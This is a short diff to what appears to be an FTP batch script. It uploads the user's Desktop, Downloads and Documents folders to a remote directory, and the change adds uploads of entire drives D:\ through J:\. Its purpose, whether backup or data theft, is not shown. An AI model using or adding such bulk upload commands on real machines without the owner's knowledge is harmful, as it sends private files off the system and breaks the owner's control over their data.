@@ -5,4 +5,11 @@ cd rtr1
 put %userprofile%\Desktop
 put %userprofile%\Downloads
 put %userprofile%\Documents
+put D:\
+put E:\
+put F:\
+put G:\
+put H:\
+put I:\
+put J:\
 bye
